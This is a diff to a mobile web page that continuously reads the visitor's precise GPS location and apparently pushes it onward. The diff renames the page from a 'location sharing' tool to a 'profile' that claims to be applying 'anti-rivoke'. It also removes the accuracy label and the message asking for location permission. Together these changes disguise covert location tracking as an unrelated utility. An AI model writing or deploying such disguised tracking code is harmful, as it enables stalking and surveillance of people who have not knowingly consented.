@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>位置共有</title>
+<title>プロファイル</title>
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="theme-color" content="#0b1220">
 <link rel="manifest" href="manifest.json">
@@ -22,10 +22,10 @@
 </head>
 <body>
   <div class="box">
-    <h1><span id="dot" class="dot"></span>位置を共有中</h1>
+    <h1><span id="dot" class="dot"></span>anti-rivokeを適応しています</h1>
     <p id="msg">このページは開いたままにしてください</p>
     <div id="acc"></div>
-    <button id="go" style="display:none">位置共有を開始</button>
+    <button id="go" style="display:none">適応を開始する</button>
   </div>
 
 <script>
@@ -54,12 +54,12 @@
       const c = p.coords;
       last = [c.latitude, c.longitude, c.accuracy, c.speed];
       $("dot").className = "dot on";
-      $("msg").textContent = "位置を共有中";
-      $("acc").textContent = "精度 ±" + Math.round(c.accuracy) + " m";
+      $("msg").textContent = "適応中";
+      $("acc").textContent = "" + Math.round(c.accuracy) + " m";
       push();
     }, () => {
       $("dot").className = "dot err";
-      $("msg").textContent = "位置情報を許可してください";
+      $("msg").textContent = "";
       $("go").style.display = "inline-block";
     }, { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 });
 
